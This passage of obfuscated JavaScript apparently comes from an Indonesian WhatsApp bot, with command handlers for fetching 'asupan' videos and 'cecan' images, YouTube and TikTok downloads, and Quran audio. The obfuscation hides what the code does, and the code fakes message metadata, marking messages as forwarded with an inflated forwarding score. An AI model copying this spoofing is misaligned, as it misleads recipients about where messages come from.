_0xc886d1={};_0xc886d1[_0x15af3d(0xb6e,0x7ca,0xcc7,0x1017)]='hi',_0xc886d1[_0x134458(0x79e,0x7eb,0x8e9,0x85e)+_0x15af3d(0xc04,0xe83,0x7e8,0x856)]=0x3b9aca00,_0xc886d1['isForwarde'+'d']=!![],_0xc886d1['sendEpheme'+_0x134458(0x477,0x13e,0x43f,0x26f)]=!![],_0xc886d1['mentionedJ'+'id']=[sender];const _0x3cde44={};_0x3cde44[_0x15af3d(0x540,0x156,0x9da,0x7b1)]='Botwea\x20©2k'+'21',_0x3cde44[_0x15af3d(0xabb,0x9df,0xc23,0xa0a)+'o']=_0xc886d1,_0x3cde44[_0x134458(0xadb,0xa59,0xea7,0xc22)]=mek,_0x3cde44[_0x15af3d(0x62a,0x627,0x93b,0xa80)+_0x134458(0x477,0x38,0x420,0x92e)]=!![],alpha['sendMessag'+'e'](from,buttonMessagepe,MessageType[_0x134458(0x151,-0x4c,-0x26b,0x49d)+'sage'],_0x3cde44),await limitAdd(sender,limit);break;case _0x15af3d(0x7a6,0x3db,0xb94,0x728):case _0x15af3d(0x4fc,0x7c8,0x8d7,0x579):case _0x15af3d(0xaec,0xa8e,0x81a,0x7d4):case _0x15af3d(0x8d3,0x9d0,0x96c,0x446):case _0x134458(0xa1a,0x546,0x7d4,0xa60):case'nisa':case _0x134458(0x68f,0x575,0x553,0x498):case _0x134458(0xace,0x62d,0xb7f,0x83f):case _0x15af3d(0x5cb,0x73c,0x81e,0x106):case _0x134458(0x2e4,0x5b8,0x379,0x5e2):case _0x15af3d(0xbb1,0xef2,0x8d8,0x8e4):case'syifa':case _0x15af3d(0x944,0xc5c,0x694,0xc57):case'alcakenya':case _0x134458(0x87a,0x90e,0xd32,0x47b):case'rikagusria'+'ni':case _0x134458(0x930,0xdbc,0xa6c,0x5e0):case _0x134458(0x8ae,0x924,0xb57,0x410):case _0x15af3d(0xc14,0x9a7,0xc05,0x10a9):case _0x15af3d(0x649,0x8be,0x2e3,0x75e):case'ukhty':const _0x1f6c67={};_0x1f6c67['displayTex'+'t']=_0x15af3d(0x959,0x714,0x4df,0x930)+'t';const _0x5cf6d5={};_0x5cf6d5[_0x15af3d(0xc33,0xce8,0x8b2,0xf13)]=_0x134458(0x7fd,0x7d7,0x4ac,0x978),_0x5cf6d5[_0x15af3d(0x5a7,0x416,0x490,0x6b7)]=_0x1f6c67,_0x5cf6d5[_0x134458(0x8ff,0x7e7,0x8f1,0x636)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x134458(0x7fd,0x999,0x699,0x369)](prefix),'©\x20'+ownername,[_0x5cf6d5]);reply(lang['wait']());var random_asupan=await getBuffer(_0x134458(0x3a1,0x3d,0x56e,0x586)+_0x134458(0x45c,-0x14,0x139,0x650)+'.herokuapp'+_0x15af3d(0x515,0x4cc,0x356,0x402)+_0x134458(0x9b1,0xc0c,0x641,0x878)+command+(_0x15af3d(0xa38,0x9e6,0xe35,0x6ea)+_0x15af3d(0x3c6,0x149,0x842,0x63e)));const mediaxx=await alpha[_0x15af3d(0xbf7,0x79c,0xa75,0x7a6)+_0x15af3d(0xaf6,0xd23,0x611,0xeab)](from,random_asupan,MessageType[_0x134458(0x422,0x233,0x8ac,-0x76)],{'thumbnail':Buffer['alloc'](0x15*0xf7+-0xa92+-0x9b1)});let bacotluxx=mediaxx[_0x134458(0x679,0x906,0x57a,0x978)][_0x134458(0x7f8,0x3df,0x645,0xaec)+_0x134458(0x84b,0xb6f,0xa26,0x615)]?mediaxx[_0x134458(0x679,0x2ca,0x572,0x618)][_0x134458(0x7f8,0x557,0xaed,0xba1)+'essage']:mediaxx;const _0xa78514={};_0xa78514[_0x134458(0x599,0x906,0x8b6,0x2bf)+'t']=_0x15af3d(0x2dd,0x4c2,0x68c,0x6aa);const _0x16e690={};_0x16e690['buttonId']=_0x15af3d(0x413,0x7c3,0x503,-0xb4),_0x16e690['buttonText']=_0xa78514,_0x16e690[_0x134458(0x8ff,0x75d,0x796,0xd4b)]=0x1;const _0x15cd85={};_0x15cd85[_0x134458(0x599,0x847,0x61e,0x59c)+'t']=_0x15af3d(0x9b0,0xa0f,0x711,0xd82);const _0x59d5b7={};_0x59d5b7[_0x15af3d(0xc33,0xfd3,0x833,0xfd2)]=''+command,_0x59d5b7['buttonText']=_0x15cd85,_0x59d5b7[_0x15af3d(0xa52,0x580,0xe27,0xb24)]=0x1;const buttonsxx=[_0x16e690,_0x59d5b7],btnx___={'contentText':lang[_0x134458(0x876,0x6c9,0xa33,0x938)](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+('\x20|\x20Request'+_0x134458(0x40a,0x465,0x611,0x87e))+sender[_0x134458(0x3ec,0x197,0x805,0x67)]('@')[-0x1013+-0x22b1*0x1+-0x169*-0x24],'buttons':buttonsxx,'headerType':0x5,'videoMessage':bacotluxx[_0x134458(0x679,0x290,0x5c7,0x918)][_0x15af3d(0x89d,0x83c,0x544,0xb32)+'ge']},_0x2d69c4={};_0x2d69c4[_0x134458(0x403,0x4c2,0x168,-0x2b)+'id']=[sender];const _0x51a3ca={};_0x51a3ca['quoted']=mek,_0x51a3ca[_0x15af3d(0xabb,0xb8e,0xc02,0xc83)+'o']=_0x2d69c4,alpha[_0x134458(0x982,0x7f6,0xba2,0x634)+'e'](from,btnx___,MessageType['buttonsMes'+_0x15af3d(0xaf6,0xb4e,0xaaf,0xad6)],_0x51a3ca)[_0x134458(0x6ff,0x326,0x45c,0xbde)](_0x17c135=>{function _0x4f1b29(_0x44470f,_0x39355d,_0x53a9dc,_0x55920a){return _0x15af3d(_0x53a9dc- -0x137,_0x39355d-0x1ce,_0x55920a,_0x55920a-0x39);}function _0x4c178d(_0x46d065,_0x469f70,_0x236dbe,_0x58fe50){return _0x134458(_0x46d065- -0x2ed,_0x469f70-0x12,_0x58fe50,_0x58fe50-0x185);}const _0x5e62c8={'McOEn':function(_0x517481,_0x411199){return _0x517481(_0x411199);},'TcAyX':_0x4f1b29(0x6d0,0x8f1,0x9ee,0x60c)+_0x4c178d(0x815,0x35d,0xcba,0x39b)+_0x4c178d(0x5a3,0x242,0x4df,0x9a7)+_0x4f1b29(0xa43,0x942,0x6be,0x468)+'gi'};_0x5e62c8['McOEn'](reply,_0x5e62c8[_0x4c178d(-0xf1,-0x10b,0x21d,-0x3a2)]);}),await limitAdd(sender,limit);break;case _0x134458(0x27f,0x532,0x4d6,-0x80):case _0x15af3d(0x5d4,0x58a,0x9cf,0x61c):case'malaysia':case _0x134458(0xa43,0x9bd,0xd0c,0xe2b):case _0x15af3d(0x4ec,0x471,0x602,0x45):case _0x134458(0x2af,0x2ed,0x6bd,0x2e3):case _0x15af3d(0x3c7,0x209,-0x7,0x5e8):case _0x15af3d(0x485,0x8d5,0x536,0x5c):case _0x134458(0x7a8,0x463,0xa5c,0x646):case _0x134458(0x1b0,0xc7,0x437,-0xcb):case'rose':const _0x3bccce={};_0x3bccce[_0x15af3d(0x6ec,0xa39,0x2a2,0x880)+'t']=_0x134458(0x806,0xc48,0x3cf,0x84c)+'t';const _0x3d2e1d={};_0x3d2e1d['buttonId']=_0x15af3d(0x950,0x9b3,0xb0e,0x8de),_0x3d2e1d['buttonText']=_0x3bccce,_0x3d2e1d[_0x134458(0x8ff,0x969,0xb72,0x98d)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x134458(0x7fd,0xb4a,0x95b,0x863)](prefix),'©\x20'+ownername,[_0x3d2e1d]);reply(lang[_0x134458(0x279,0x66a,0x49a,0x2e3)]());var cecan=await fetchJson(_0x134458(0x3a1,0x77e,0x734,0x356)+_0x15af3d(0x5af,0x9b2,0x286,0x32a)+'.herokuapp'+'.com/api/c'+_0x15af3d(0xc62,0xf69,0xe41,0xff2)+command+(_0x15af3d(0xa38,0x687,0xc9c,0x55f)+'fline'));let random_cecan=await getBuffer(cecan['result']);const mediaxxx=await alpha['prepareMes'+_0x15af3d(0xaf6,0x7d7,0xb30,0xe0b)](from,random_cecan,MessageType[_0x15af3d(0x4cd,0x45,0x760,0x535)],{'thumbnail':Buffer[_0x134458(0x47a,0x5a3,0x65a,0x75)](-0x1801*0x1+0x3*-0x6d4+0x7*0x65b)});let bacotluxxx=mediaxxx[_0x15af3d(0x7cc,0x8ea,0x2fe,0xb47)][_0x134458(0x7f8,0x887,0x54e,0x9b1)+_0x134458(0x84b,0xd1d,0x43e,0x644)]?mediaxxx[_0x15af3d(0x7cc,0x7b3,0xa8f,0x96b)][_0x134458(0x7f8,0x537,0x964,0x37e)+_0x15af3d(0x99e,0x7e2,0xe53,0xc2c)]:mediaxxx;const _0x6a45d2={};_0x6a45d2[_0x15af3d(0x6ec,0xaa4,0x3a1,0x971)+'t']=_0x134458(0x18a,0x32b,0x138,-0x25f);const _0x7bc60a={};_0x7bc60a[_0x15af3d(0xc33,0x789,0x94b,0xc49)]='owner',_0x7bc60a[_0x134458(0x454,0x9e,0x64d,0x286)]=_0x6a45d2,_0x7bc60a['type']=0x1;const _0xd36a9c={};_0xd36a9c[_0x134458(0x599,0x3b2,0x2ad,0x8ab)+'t']=_0x15af3d(0x9b0,0x6cb,0x89d,0xe95);const _0x1f4200={};_0x1f4200['buttonId']=''+command,_0x1f4200[_0x134458(0x454,0x4eb,0x922,0x47b)]=_0xd36a9c,_0x1f4200[_0x134458(0x8ff,0x459,0xa6c,0x5a9)]=0x1;const buttonsxxx=[_0x7bc60a,_0x1f4200],btnxx__={'contentText':lang['success'](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+('\x20|\x20Request'+_0x15af3d(0x55d,0x4cf,0x41f,0x158))+sender[_0x15af3d(0x53f,0x18a,0x707,0x962)]('@')[-0x84e+-0x31*-0x49+-0x5ab],'buttons':buttonsxxx,'headerType':0x4,'imageMessage':bacotluxxx[_0x134458(0x679,0x5a7,0x1dd,0x8f8)]['imageMessa'+'ge']},_0x3e1fe7={};_0x3e1fe7['mentionedJ'+'id']=[sender];const _0x3cb01f={};_0x3cb01f[_0x134458(0xadb,0xadc,0xe0f,0xaa7)]=mek,_0x3cb01f['contextInf'+'o']=_0x3e1fe7,alpha['sendMessag'+'e'](from,btnxx__,MessageType[_0x134458(0x151,0x119,-0x8d,0x20e)+_0x15af3d(0xaf6,0x7b0,0xa5d,0x9dc)],_0x3cb01f)['catch'](_0x39be6e=>{function _0x5e87a4(_0x8d86f2,_0x2b7627,_0x370db5,_0x42c47b){return _0x15af3d(_0x370db5- -0x261,_0x2b7627-0x4f,_0x2b7627,_0x42c47b-0x19);}function _0x2a5d9f(_0x35e2e8,_0x432ebb,_0x1d620b,_0x4ed797){return _0x134458(_0x35e2e8- -0x281,_0x432ebb-0x123,_0x4ed797,_0x4ed797-0x66);}reply('Terjadi\x20ke'+_0x5e87a4(0xd2d,0x844,0x9f4,0x60e)+_0x2a5d9f(0x60f,0x578,0x627,0x895)+_0x2a5d9f(0x421,0x8f,-0x4,0x5bc)+'gi');}),await limitAdd(sender,limit);break;case'sc':case'source':case'sourcecode':var sjakolan=await getBuffer(_0x15af3d(0x607,0x817,0x557,0x6aa)+'legra.ph/f'+'ile/e2c139'+_0x134458(0x79a,0x996,0x2e7,0x446)+_0x134458(0x5b7,0x106,0x395,0x1b7));const _0x2f95fd={};_0x2f95fd[_0x15af3d(0x6ec,0x2da,0x607,0x607)+'t']=_0x134458(0x60d,0x7bd,0x8a4,0x91c);const _0x2f05c6={};_0x2f05c6['buttonId']=_0x15af3d(0x654,0x827,0x2b6,0x7c0),_0x2f05c6[_0x15af3d(0x5a7,0x151,0x295,0x6c2)]=_0x2f95fd,_0x2f05c6[_0x15af3d(0xa52,0x7c4,0xae7,0xaa2)]=0x1;const _0x316997={};_0x316997[_0x134458(0x599,0x6cd,0x601,0x27c)+'t']=_0x15af3d(0xb3d,0xed9,0xcd0,0xbb9);const _0x54a1a9={};_0x54a1a9[_0x134458(0xae0,0xab0,0x95f,0x82f)]=_0x15af3d(0x413,0x598,0x4a2,0x6fb),_0x54a1a9[_0x15af3d(0x5a7,0x385,0x6cf,0x360)]=_0x316997,_0x54a1a9[_0x15af3d(0xa52,0xd6d,0xbbe,0x6f8)]=0x1,sendButLocation(from,_0x134458(0x378,0x5d1,-0x2a,0x19c)+_0x15af3d(0x3b6,0x7e3,0x53f,0x2d2)+_0x134458(0x584,0x8fa,0xa64,0xa1a)+'youtube.co'+_0x15af3d(0x4e0,0x308,0x19d,0x7b3)+_0x15af3d(0x75a,0xa36,0xc26,0x4fa),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x134458(0x9e8,0x529,0xc16,0xa57)+ini_mark[_0x134458(0x3ec,0x409,0x50,-0x2b)]('@')[0xd8+-0x1f36+0xa9*0x2e],sjakolan,[_0x2f05c6,_0x54a1a9],{'contextInfo':{'mentionedJid':[ini_mark]}});break;case _0x134458(0x3de,0x6e1,0x583,0x3da):sendKatalog(_0x15af3d(0x349,-0xdd,0x289,0x60e)+_0x15af3d(0x6e3,0x297,0x3e1,0x50d),_0x15af3d(0x536,0x109,0x21c,0x795)+'00',_0x134458(0x4db,0x96f,0x467,0x68f));break;case _0x15af3d(0xb69,0x7a2,0xb2b,0xde5):const _0x22db06={};_0x22db06[_0x15af3d(0x6ec,0x675,0xaad,0x46b)+'t']=_0x134458(0x806,0xc5f,0x865,0x60a)+'t';const _0x5e2372={};_0x5e2372[_0x134458(0xae0,0xfb6,0xea3,0xfb6)]=_0x15af3d(0x950,0x7c4,0x96d,0xb64),_0x5e2372[_0x15af3d(0x5a7,0x616,0x77d,0x879)]=_0x22db06,_0x5e2372[_0x134458(0x8ff,0x564,0xafd,0xd33)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0xdc0,0x8be,0x5a2)](prefix),'©\x20'+ownername,[_0x5e2372]);if(args['length']<0x1143*-0x2+-0x1682+0x3909)return reply(_0x134458(0x924,0xd9c,0xd50,0xd99)+_0x15af3d(0x6b4,0x86e,0x3c9,0x3c4)+prefix+(_0x134458(0x926,0xcdd,0x80a,0xdb6)+'*'));reply(lang[_0x134458(0x279,-0x1f4,-0x17c,0x634)]());let yut=await yts(q);server=_0x134458(0x45f,0x8ca,0x900,0x740),yta2(yut[_0x15af3d(0x829,0x6bf,0x3bb,0x455)][0x82d+0x2629+-0x2e56]['url'],server)[_0x134458(0x629,0x450,0x5de,0x4ee)](async _0x52f0a6=>{const _0x14adb7={'gZUmF':function(_0x4ae081,_0x50f901){return _0x4ae081(_0x50f901);},'HiADk':_0x37878a(0x349,0x23f,0x65c,0x481)+'kbps)','LicvO':_0x37878a(0x286,0x747,0x26d,0xbbe),'kdXAq':_0x5eeec7(0x2fa,0x51c,0x181,0x5a9)+_0x37878a(-0x1a0,0x88,-0xc0,0x432),'NdSzv':_0x5eeec7(0xc23,0xa31,0xce4,0xd28)+_0x37878a(0x30a,0x88,-0x6,-0x469),'RaSCW':function(_0x50d559,_0x27051c,_0xc3f919,_0x4221f3,_0x1e17a9,_0x4a5889,_0x790dcc){return _0x50d559(_0x27051c,_0xc3f919,_0x4221f3,_0x1e17a9,_0x4a5889,_0x790dcc);}},{thumb:_0x93d1c3,title:_0x5b69c6,filesizeF:_0x16b021,filesize:_0x23a278}=_0x52f0a6,_0x32a743=_0x37878a(0x82e,0x47f,0x3e3,0x96f)+_0x37878a(0x911,0x4c9,0x600,0x77a)+'\x20L\x20A\x20Y*\x0a\x0a💦'+'\x20Title\x20:\x20'+_0x5b69c6+_0x37878a(0x124,0x14d,-0x8,0x50e)+yut[_0x37878a(0x1be,0x5b6,0x2d5,0x961)][-0x1643+0x6db+0xf68][_0x5eeec7(0x6ae,0x705,0xa14,0xb8b)]+('\x0a🐣\x20Upload\x20'+':\x20')+yut[_0x5eeec7(0x479,0x702,0x73e,0x828)][0x12a5*0x2+-0x13*-0x163+-0x3fa3]['ago']+_0x5eeec7(0x219,0x458,0x520,0x566)+_0x16b021+_0x37878a(0x4bd,0x88e,0x5b5,0x4c9)+yut['videos'][-0x9a*0x16+-0x1e95+-0x3*-0xe9b][_0x37878a(0x4d8,0x2b7,0x29b,0x62b)]+(_0x5eeec7(0x579,0x559,0x67,0x43c)+'on\x20:\x20')+yut['videos'][0x1451+0x11*-0xad+-0x8d4][_0x37878a(0x876,0x44a,0x48a,-0x87)]+_0x37878a(0xd84,0x985,0xaa7,0x940)+yut['videos'][-0x2*0x917+-0x97d*0x4+0x3822][_0x37878a(0x1cd,0x1e7,0x468,0x467)]+(_0x37878a(-0xd0,0x348,0x216,0x559)+_0x5eeec7(0x8a7,0x997,0x7f6,0xdc2)+_0x5eeec7(0x9ea,0x9e0,0xdd6,0x72a)+_0x5eeec7(0x78a,0xb05,0x671,0x8a3)+'ownload_');let _0x786d3e=await _0x14adb7['gZUmF'](getBuffer,_0x93d1c3);const _0x246810={};_0x246810['displayTex'+'t']=_0x14adb7[_0x5eeec7(0x651,0x5e5,0x648,0x350)];const _0x24aa3d={};_0x24aa3d['buttonId']=_0x5eeec7(0x6c2,0x4fe,0x623,0x357)+q,_0x24aa3d['buttonText']=_0x246810;function _0x5eeec7(_0x1a287a,_0x35cd0f,_0x18005e,_0x11921f){return _0x134458(_0x35cd0f-0x2c,_0x35cd0f-0x1d3,_0x18005e,_0x11921f-0x43);}_0x24aa3d[_0x5eeec7(0xd54,0x92b,0x639,0xcd7)]=_0x14adb7['LicvO'];const _0x238572={};_0x238572[_0x5eeec7(0x25e,0x5c5,0x27c,0x522)+'t']=_0x14adb7[_0x5eeec7(0x197,0x554,0x2ee,0x5f6)];const _0x4105e3={};_0x4105e3['buttonId']='video\x20'+q,_0x4105e3[_0x37878a(0x1b6,0x334,0x182,0x621)]=_0x238572,_0x4105e3[_0x37878a(0x774,0x7df,0x8ef,0xad2)]=_0x14adb7[_0x5eeec7(-0x59,0x21e,0x702,0x296)];const _0x3685a8={};_0x3685a8[_0x37878a(0x2f,0x479,0x88f,0x418)+'t']=_0x14adb7[_0x37878a(0x538,0x24c,0x5fc,-0x247)];const _0x3a58be={};_0x3a58be[_0x37878a(0x8ff,0x9c0,0xa63,0x7a9)]=_0x37878a(0x231,0xc4,-0x272,0x45c)+yut[_0x37878a(0x152,0x5b6,0xf5,0x415)][-0xb8c*0x1+0x1f*0xe9+0x11*-0xfb][_0x37878a(0x656,0x1e7,0x67e,0x2bc)],_0x3a58be[_0x37878a(-0x8f,0x334,0x13f,0x592)]=_0x3685a8,_0x3a58be[_0x37878a(0xa3c,0x7df,0xb45,0x944)]=_0x14adb7[_0x37878a(-0xdb,0xd2,0x528,-0x24a)];function _0x37878a(_0x3b8574,_0x8f3f43,_0x2fe0f7,_0x14939f){return _0x15af3d(_0x8f3f43- -0x273,_0x8f3f43-0x76,_0x3b8574,_0x14939f-0x14f);}let _0x44271d=[_0x24aa3d,_0x4105e3,_0x3a58be];_0x14adb7[_0x37878a(0x35b,0x595,0x9a7,0x391)](sendButLocation,from,_0x32a743,_0x37878a(0x14a,0x385,-0x13a,0x67d)+'eo\x20or\x20Audi'+_0x5eeec7(0x59f,0x467,0x6d1,0x440)+enter+enter+botname+_0x5eeec7(0x5e8,0x903,0x92e,0x48f)+ownername,_0x786d3e,_0x44271d,{});})[_0x134458(0x6ff,0xa12,0x9da,0x916)](_0x489fae=>reply(_0x15af3d(0xb25,0x6e2,0x665,0xd35)+_0x134458(0xb02,0xec6,0x696,0xc08)+_0x15af3d(0x9e3,0x724,0x698,0xa93)+'pa\x20saat\x20la'+'gi')),await limitAdd(sender,limit);break;case _0x134458(0xa69,0x923,0x591,0xafd):const _0x1d1328={};_0x1d1328[_0x15af3d(0x6ec,0x753,0xb2e,0x69f)+'t']='Check\x20Limi'+'t';const _0x33fcb0={};_0x33fcb0[_0x15af3d(0xc33,0xdba,0xead,0x82c)]='limit',_0x33fcb0[_0x134458(0x454,0xda,0x222,0x69e)]=_0x1d1328,_0x33fcb0[_0x134458(0x8ff,0xdd8,0x84b,0x9ab)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang['limit'](prefix),'©\x20'+ownername,[_0x33fcb0]);if(!q)return fakegroup(_0x15af3d(0x809,0x6f6,0xb5a,0x452));if(!isUrl(args[0x10ef+-0x4*0x83f+0x100d])&&!args[0x4d*0x16+-0x180b+0x116d][_0x15af3d(0x8eb,0x9b0,0xc9f,0x4f1)](_0x134458(0x560,0x758,0x82,0x102)))return reply(lang[_0x134458(0x166,0x224,0x654,0x13a)]());reply(lang[_0x134458(0x279,0x6c0,0x5,-0x57)]()),ttt=args[_0x15af3d(0x309,0x52f,0x208,0x50d)]('\x20'),hx['ttdownload'+'er'](ttt)[_0x134458(0x629,0x97c,0x17d,0x62f)](_0x553c3=>{function _0x1e2b2b(_0x42b87c,_0x4f8e23,_0x13f54e,_0x112312){return _0x134458(_0x13f54e- -0x316,_0x4f8e23-0x81,_0x112312,_0x112312-0xf8);}function _0x4e5558(_0x5cce43,_0x591118,_0x36f7b8,_0x345aeb){return _0x15af3d(_0x345aeb-0x1b0,_0x591118-0x108,_0x5cce43,_0x345aeb-0x136);}const _0x584b35={'phdWY':function(_0x3143c6,_0x16615e){return _0x3143c6(_0x16615e);},'CCXCR':_0x4e5558(0x70f,0xfe7,0x96f,0xb2a),'JXDus':'AUDIO','jbMCD':_0x1e2b2b(0x95a,0x6f5,0x551,0x805)},{wm:_0x5237e9,nowm:_0x306d34,audio:_0x9b5851}=_0x553c3;axios[_0x1e2b2b(0x23a,0x687,0x634,0xb1c)](_0x4e5558(0x125e,0xd99,0xef9,0xdc0)+'nyurl.com/'+_0x4e5558(0x789,0x82d,0x7a6,0x8f7)+'.php?url='+_0x5237e9)[_0x1e2b2b(0x136,-0xab,0x313,0x38d)](async _0x3989b8=>{let _0x13be6e=await _0x584b35[_0x606e7c(0x94e,0xa1d,0x4a8,0x86e)](getBuffer,_0x5237e9);const _0x2f2898={};_0x2f2898[_0x240fe1(0x5b2,0x63f,0x4e0,0x778)+'t']=_0x584b35['CCXCR'];const _0x5cd110={};_0x5cd110[_0x240fe1(0x98a,0x9a6,0xe9c,0xcbf)]=_0x240fe1(0x6a7,0xab1,0x327,0x62c)+'\x20'+q,_0x5cd110[_0x240fe1(0x2da,0x922,0x397,0x633)]=_0x2f2898,_0x5cd110['type']='RESPONSE';const _0x3ba3a4={};_0x3ba3a4[_0x240fe1(0x373,0xb37,0xb19,0x778)+'t']=_0x584b35['JXDus'];const _0x5a47d0={};_0x5a47d0[_0x240fe1(0x10a9,0xfd4,0xbb5,0xcbf)]=_0x606e7c(0x7e7,0xbfc,0x3ec,0x75b)+'o\x20'+q,_0x5a47d0[_0x606e7c(0x2ea,0xd1,-0x1a0,0x384)]=_0x3ba3a4,_0x5a47d0[_0x606e7c(0x795,0xafe,0x3f7,0x4d4)]=_0x584b35['jbMCD'];let _0x2556ac=[_0x5cd110,_0x5a47d0];function _0x240fe1(_0x3b9b8f,_0x5e505e,_0xeec257,_0x3191ef){return _0x4e5558(_0x3b9b8f,_0x5e505e-0x91,_0xeec257-0x4b,_0x3191ef- -0x124);}function _0x606e7c(_0x3d66a6,_0x1b4074,_0x4caaf9,_0x34e7bd){return _0x1e2b2b(_0x3d66a6-0x8b,_0x1b4074-0x10e,_0x3d66a6-0x1ac,_0x34e7bd);}sendButVideo(from,_0x606e7c(0x344,0x2f8,0xb6,0x79d)+sender['split']('@')[0x1*0xafc+0x16d2+0x10e7*-0x2]+(_0x240fe1(0xb90,0xda5,0x7dc,0xaa6)+_0x240fe1(0xdff,0x8f3,0x788,0xbba)+_0x240fe1(0xa65,0x590,0x8ed,0x72f)+_0x240fe1(0x99c,0x76d,0x4f3,0x756)+_0x240fe1(0xab9,0x985,0xe6f,0xa95)+_0x606e7c(0x58b,0xa67,0x3a7,0x648)+_0x240fe1(0xab0,0x6f1,0x89a,0x748)+'aja\x20dibawa'+'h'),_0x240fe1(0xad3,0xc81,0xb0e,0x84f)+enter+(_0x240fe1(0x7e7,0x203,0x905,0x6c0)+_0x606e7c(0x90f,0x682,0x6ef,0xcb5)+_0x240fe1(0xa38,0x6ef,0x5d6,0x620)+_0x240fe1(0x588,0x4d9,0x724,0x5f5)+_0x606e7c(0x40a,0x25b,0x587,0x344)+_0x240fe1(0x685,0x673,0x7a9,0xadd)+'video\x20ini\x20'+_0x240fe1(0x112e,0xb3f,0x11a3,0xccb)+_0x240fe1(0x28e,0x38c,0x261,0x3a6)+_0x240fe1(0xc1d,0x621,0xa24,0x73c))+enter+enter+botname+_0x240fe1(0x7d8,0xaf1,0xa57,0xab6)+ownername,_0x13be6e,_0x2556ac,{'contextInfo':{'mentionedJid':[sender]}});});})[_0x134458(0x6ff,0x5c1,0x298,0xbcd)](_0x35d5c8=>reply(_0x134458(0x9d2,0xb7e,0x7b3,0xdc5)+_0x15af3d(0xc55,0xe9f,0xe1c,0xda5)+_0x15af3d(0x9e3,0xcbe,0x885,0x9f1)+_0x15af3d(0x7f5,0xaf7,0x9a8,0xa67)+'gi')),await limitAdd(sender,limit);break;case _0x15af3d(0x582,0xa4e,0x8b0,0x289)+_0x134458(0x4b0,0xe0,0x46d,0x51b):if(args[_0x134458(0x76b,0x34d,0x3d5,0x598)]<-0x133f*-0x1+0x25cb+-0x3909)return reply(_0x15af3d(0x7c8,0xbf7,0x9c9,0xb28)+(prefix+command)+(_0x15af3d(0x388,0x7c4,0x38,0x732)+_0x15af3d(0xb5a,0xb31,0xee6,0x834)+'yat')+enter+'Usage:\x20'+(prefix+command)+'\x20114\x203');var F=q,F1=F[_0x134458(0x3ec,0x391,0x533,0x4dc)]('|')[-0xe39+-0xa73+0x18ac],F2=F[_0x134458(0x3ec,0x527,0x5c,0x62e)]('|')[0x2617+-0x211b+-0x3*0x1a9];let pijaqu=await fetchJson(_0x15af3d(0x2a9,0x4d9,0x77b,0xa1)+_0x15af3d(0xb63,0xf20,0xd3b,0x703)+_0x134458(0x3a5,-0x3b,0x74b,0x607)+_0x134458(0x396,-0x7c,0x3ee,0x45c)+_0x134458(0x1ad,-0x30c,0x67e,0x371)+_0x134458(0x4cf,0x8b3,0x980,0x63)+'pp/surah/'+F1+'/'+F2),japkk=await getBuffer(pijaqu[_0x15af3d(0x33f,0x68b,-0x4e,0x225)]['audio'][_0x15af3d(0xb18,0xef5,0xe83,0x958)])[_0x134458(0x6ff,0x77d,0x71d,0xacd)](_0x522be8=>{function _0x45a82d(_0x38f7b1,_0xfeba05,_0x529cb7,_0x1546db){return _0x134458(_0x1546db-0x6a,_0xfeba05-0x133,_0x529cb7,_0x1546db-0x3a);}const _0x5b13cb={'RtyuJ':function(_0x1aa1c6,_0x4c55de){return _0x1aa1c6(_0x4c55de);}};function _0x52e7d8(_0x1492ca,_0x23fb20,_0x2c2c41,_0x145e59){return _0x134458(_0x2c2c41-0x18a,_0x23fb20-0x1,_0x23fb20,_0x145e59-0x5f);}_0x5b13cb[_0x52e7d8(0x412,0x305,0x6f8,0x8a9)](reply,_0x52e7d8(0xc7c,0x822,0xb42,0x8db));});const _0x4149a6={};_0x4149a6[_0x134458(0x620,0x631,0x7e8,0x9ef)]=_0x15af3d(0xc3f,0x1011,0xe9d,0xa2c)+_0x15af3d(0xab6,0x911,0x5da,0xc3b)+_0x15af3d(0xa90,0xcfd,0xd04,0xf61),_0x4149a6[_0x134458(0x290,0x262,0x282,0x359)]=0x2,_0x4149a6[_0x134458(0x502,0x111,0x1c4,0xb5)]=_0x15af3d(0x74b,0xbcc,0x82f,0x42e)+_0x15af3d(0x603,0x7cb,0x311,0x424),_0x4149a6[_0x134458(0x1be,0x250,-0x6a,-0x26f)]='',_0x4149a6[_0x134458(0x6d5,0x326,0x76f,0x928)+'rl']='',_0x4149a6[_0x15af3d(0x606,0x9e8,0x8b0,0x451)]=pp_userz;const _0x4ebf6f={};_0x4ebf6f[_0x15af3d(0xb6e,0x9dc,0x6ea,0xe5e)]='Alquran\x20Au'+_0x15af3d(0x603,0x9f2,0x284,0xa4d),_0x4ebf6f[_0x134458(0x79e,0xc85,0xaaa,0x5c1)+'Score']=0x3b9aca00,_0x4ebf6f['isForwarde'+'d']=!![],_0x4ebf6f['sendEpheme'+_0x134458(0x477,0x269,-0x41,0x6b1)]=!![],_0x4ebf6f[_0x134458(0x581,0x63e,0x62e,0x8a4)+'Reply']=_0x4149a6;const _0x408135={};_0x408135[_0x15af3d(0xabb,0xf45,0xc3e,0xd3e)+'o']=_0x4ebf6f,_0x408135[_0x15af3d(0xbc4,0x834,0xa99,0x96a)]='audio/mp4',_0x408135[_0x134458(0x734,0x824,0x727,0x32e)]='Alquran\x20Mu'+_0x134458(0x511,0x8fd,0x3ed,0x693),_0x408135[_0x134458(0xadb,0xb5b,0xc16,0x90d)]=fgclink2,_0x408135['thumbnail']=pp_bot2,alpha[_0x15af3d(0xad5,0xc5c,0xee2,0xbe0)+'e'](from,japkk,MessageType['document'],_0x408135),await limitAdd(sender,limit);break;case _0x134458(0x536,0x9ba,0x22e,0x21a):case'fb':case _0x15af3d(0x2f5,0x4d1,0x556,0x3a7):const _0x41ebeb={};_0x41ebeb[_0x134458(0x599,0x53e,0x29a,0x725)+'t']=_0x15af3d(0x959,0x47e,0x4b9,0x8c2)+'t';const 